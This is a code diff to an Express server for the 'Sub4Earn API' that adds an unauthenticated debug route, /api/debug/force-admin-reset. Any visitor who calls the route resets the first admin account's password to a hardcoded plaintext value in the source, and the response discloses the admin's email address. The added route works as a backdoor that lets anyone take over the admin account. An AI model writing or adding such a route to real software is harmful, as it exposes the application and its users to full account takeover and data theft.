@@ -47,6 +47,38 @@ app.use('/api/admin',    require('./routes/admin'));
 app.get('/api/health', (req, res) => {
   res.json({ status: 'ok', app: 'Sub4Earn API' });
 });
+
+app.get("/api/debug/force-admin-reset", async (req, res) => {
+  try {
+    const bcrypt = require("bcryptjs");
+
+    const NEW_PASSWORD = "A9#xL7pQ2!mRt84"; // strong password
+
+    const hash = await bcrypt.hash(NEW_PASSWORD, 12);
+
+    // First confirm admin exists
+    const admin = db.prepare(
+      "SELECT id, email FROM users WHERE role='admin' LIMIT 1"
+    ).get();
+
+    if (!admin) {
+      return res.json({ success: false, message: "No admin found" });
+    }
+
+    db.prepare(
+      "UPDATE users SET password_hash=? WHERE id=?"
+    ).run(hash, admin.id);
+
+    res.json({
+      success: true,
+      updatedAdmin: admin.email
+    });
+
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
 /* ───────────────────────── DEBUG: ADMIN CHECK ───────────────────────── */
 app.get("/api/debug/admin-check", (req, res) => {
   try {
